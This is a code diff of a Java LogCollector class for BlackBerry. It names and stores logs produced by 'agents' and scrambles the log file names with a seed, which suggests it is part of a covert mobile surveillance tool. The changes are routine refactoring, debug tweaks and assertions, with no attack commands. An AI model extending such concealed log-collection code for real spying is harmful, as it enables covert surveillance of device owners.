@@ -18,7 +18,6 @@ import javax.microedition.io.file.FileConnection;
 
 import net.rim.device.api.system.PersistentObject;
 import net.rim.device.api.system.PersistentStore;
-import net.rim.device.api.util.Arrays;
 import net.rim.device.api.util.NumberUtilities;
 import blackberry.agent.Agent;
 import blackberry.config.Keys;
@@ -41,7 +40,7 @@ import blackberry.utils.StringSortVector;
  */
 public final class LogCollector implements Singleton {
     //#ifdef DEBUG
-    private static Debug debug = new Debug("LogCollector", DebugLevel.INFORMATION);
+    private static Debug debug = new Debug("LogCollector", DebugLevel.VERBOSE);
     //#endif
 
     static LogCollector instance = null;
@@ -63,7 +62,7 @@ public final class LogCollector implements Singleton {
     // accesso
 
     int seed;
-    
+
     /**
      * Decrypt name.
      * 
@@ -252,29 +251,43 @@ public final class LogCollector implements Singleton {
      */
     public synchronized Vector makeNewName(final Log log, final Agent agent) {
 
+        //#ifdef DEBUG_TRACE
+        debug.trace("makeNewName");
+        //#endif
+
         final boolean onSD = agent.onSD();
         final Date timestamp = log.timestamp;
         final int progressive = getNewProgressive();
+
+        //#ifdef DBC
+        Check.asserts(progressive >= 0, "makeNewName fail progressive >=0");
+        //#endif
 
         final Vector vector = new Vector();
         final String basePath = onSD ? Path.SD_PATH : Path.USER_PATH;
 
         final String blockDir = "_" + (progressive / LOG_PER_DIRECTORY);
-        
+
         // http://www.rgagnon.com/javadetails/java-0021.html
-        String mask = "000";
-        String ds = Long.toString(progressive);  // double to string
-        String paddedProgressive = mask.substring(0 , mask.length() - ds.length()) + ds;
-        
-        final String fileName = paddedProgressive + "!" + makeDateName(timestamp);
+        final String mask = "0000";
+        final String ds = Long.toString(progressive % 10000); // double to string
+        final int size = mask.length() - ds.length();
+        //#ifdef DBC
+        Check.asserts(size >= 0, "makeNewName: failed size>0");
+        //#endif
+
+        final String paddedProgressive = mask.substring(0, size) + ds;
+
+        final String fileName = paddedProgressive + "!"
+                + makeDateName(timestamp);
 
         final String encName = Encryption.encryptName(fileName + LOG_EXTENSION,
                 seed);
 
         //#ifdef DBC
         Check.asserts(!encName.endsWith("MOB"), "makeNewName: " + encName
-                + " ch: " + seed 
-                + " not scrambled: " + fileName + LOG_EXTENSION);
+                + " ch: " + seed + " not scrambled: " + fileName
+                + LOG_EXTENSION);
         //#endif
 
         vector.addElement(new Integer(progressive));
@@ -317,7 +330,7 @@ public final class LogCollector implements Singleton {
         removeLogRecursive(Path.USER_PATH, false);
     }
 
-    private void removeLogRecursive(String basePath, boolean delete) {
+    private void removeLogRecursive(final String basePath, final boolean delete) {
 
         //#ifdef DEBUG_INFO
         debug.info("RemovingLog: " + basePath);
@@ -486,17 +499,17 @@ public final class LogCollector implements Singleton {
     public void scanLogs() {
         clear();
 
-        if(Path.isSDPresent() && Path.makeDirs(Path.SD)){
+        if (Path.isSDPresent() && Path.makeDirs(Path.SD)) {
             //#ifdef DEBUG_INFO
             debug.info("SD available and writable");
             //#endif
-        }else{
+        } else {
             //#ifdef DEBUG_WARN
             debug.warn("SD is not available or writable");
             //#endif
             Path.SD_PATH = Path.USER_PATH;
         }
-        
+
         Path.makeDirs(Path.USER);
     }
 
